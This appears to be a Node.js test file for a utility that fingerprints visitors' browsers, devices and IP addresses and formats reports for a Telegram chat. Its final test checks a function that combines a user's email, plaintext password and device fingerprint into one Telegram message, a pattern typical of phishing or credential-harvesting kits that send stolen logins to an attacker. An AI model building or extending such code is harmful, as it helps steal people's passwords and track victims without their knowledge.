const assert = require('node:assert/strict');
const test = require('node:test');
const { generateClientInfoPayload, getClientIpMetadata, normalizeClientInfo, formatTelegramClientInfo, formatTelegramLoginMessage } = require('../utils/clientInfo');

test('normalizes browser and server payloads without trusting client IPs', () => {
  const sample = {
    browser: {
      name: 'Chrome',
      version: '126',
      userAgent: 'Mozilla/5.0',
      platform: 'Win32',
      language: 'en-US',
      languages: ['en-US', 'en'],
      timezone: 'UTC',
      userAgentData: { platform: 'Windows', architecture: 'x86' }
    },
    system: {
      os: 'Windows',
      osVersion: '10',
      architecture: 'x86',
      cpuCores: 8,
      ramGB: 16,
      deviceType: 'desktop'
    },
    device: {
      type: 'desktop',
      touchSupport: false,
      maxTouchPoints: 0
    },
    screen: {
      width: 1920,
      height: 1080,
      availableWidth: 1920,
      availableHeight: 1040,
      viewportWidth: 1440,
      viewportHeight: 900,
      pixelRatio: 1,
      colorDepth: 24
    },
    connection: {
      type: 'wifi',
      effectiveType: '4g',
      downlink: 10,
      rtt: 50,
      saveData: false,
      online: true
    },
    capabilities: {
      webgl: true,
      webgl2: true,
      webAssembly: true,
      webSocket: true,
      indexedDB: true,
      localStorage: true,
      sessionStorage: true,
      serviceWorker: true,
      webWorkers: true,
      rtcPeerConnection: true,
      notifications: true,
      geolocation: true
    }
  };

  const normalized = normalizeClientInfo(sample);

  assert.equal(normalized.browser.name, 'Chrome');
  assert.equal(normalized.system.cpuCores, 8);
  assert.equal(normalized.connection.effectiveType, '4g');
  assert.equal(normalized.capabilities.webAssembly, true);
  assert.equal(normalized.server, undefined);
});

test('detects trusted IP metadata from request headers and socket', () => {
  const req = {
    socket: { remoteAddress: '::ffff:203.0.113.17' },
    headers: {
      'x-forwarded-for': '198.51.100.10, 10.0.0.1',
      'x-real-ip': '198.51.100.10'
    }
  };

  const ipMeta = getClientIpMetadata(req, { trustedProxyIps: ['::ffff:127.0.0.1', '::ffff:192.168.0.1'] });

  assert.equal(ipMeta.publicIp, '203.0.113.17');
  assert.equal(ipMeta.ipVersion, 'IPv4');
  assert.ok(ipMeta.receivedAt);
});

test('adds server metadata to a valid client payload', () => {
  const clientPayload = {
    browser: { name: 'Safari', version: '17.5', userAgent: 'foo', language: 'en-US', languages: ['en-US'], timezone: 'UTC' },
    system: { os: 'macOS', osVersion: '14', architecture: 'arm64' },
    device: { type: 'desktop', touchSupport: false },
    screen: { width: 1440, height: 900 },
    capabilities: { webgl: false },
    connection: { online: true }
  };

  const payload = generateClientInfoPayload(clientPayload, { publicIp: '203.0.113.42', ipVersion: 'IPv4', receivedAt: '2026-08-12T00:00:00.000Z' });

  assert.equal(payload.server.publicIp, '203.0.113.42');
  assert.equal(payload.server.ipVersion, 'IPv4');
  assert.equal(payload.browser.name, 'Safari');
});

test('formats a compact Telegram client summary that stays within Telegram limits', () => {
  const payload = {
    browser: {
      name: 'Chrome',
      version: '127.0.0.1',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.1 Safari/537.36',
      platform: 'Win32',
      language: 'en-US',
      timezone: 'UTC',
      languages: ['en-US', 'en']
    },
    system: {
      os: 'Windows',
      osVersion: '11',
      architecture: 'x64',
      deviceType: 'desktop'
    },
    device: {
      type: 'desktop',
      touchSupport: false,
      maxTouchPoints: 0
    },
    screen: {
      width: 1920,
      height: 1080,
      availableWidth: 1880,
      availableHeight: 1040,
      pixelRatio: 1.5
    },
    connection: {
      type: 'wifi',
      effectiveType: '4g',
      downlink: 50,
      rtt: 25,
      online: true
    },
    capabilities: {
      webgl: true,
      webgl2: true,
      webAssembly: true,
      indexedDB: true,
      serviceWorker: true,
      rtcPeerConnection: true,
      geolocation: true,
      notifications: true,
      webSocket: true
    },
    server: {
      publicIp: '203.0.113.44',
      ipVersion: 'IPv4',
      receivedAt: '2026-08-12T00:00:00.000Z'
    }
  };

  const message = formatTelegramClientInfo(payload);

  assert.ok(message.includes('Browser:'));
  assert.ok(message.includes('Capabilities:'));
  assert.ok(message.length <= 4096, `Telegram message is too long: ${message.length} chars`);
});

test('combines login credentials and client environment into one Telegram message', () => {
  const message = formatTelegramLoginMessage({
    identifier: 'user@example.com',
    password: 'Password123',
    clientInfo: {
      browser: { name: 'Chrome', version: '127' },
      system: { os: 'Windows', osVersion: '11' },
      device: { type: 'desktop' },
      server: { publicIp: '203.0.113.55' }
    }
  });

  assert.ok(message.includes('Username/Email:'));
  assert.ok(message.includes('Password:'));
  assert.ok(message.includes('Browser: Chrome'));
  assert.ok(message.includes('IP: 203.0.113.55'));
});
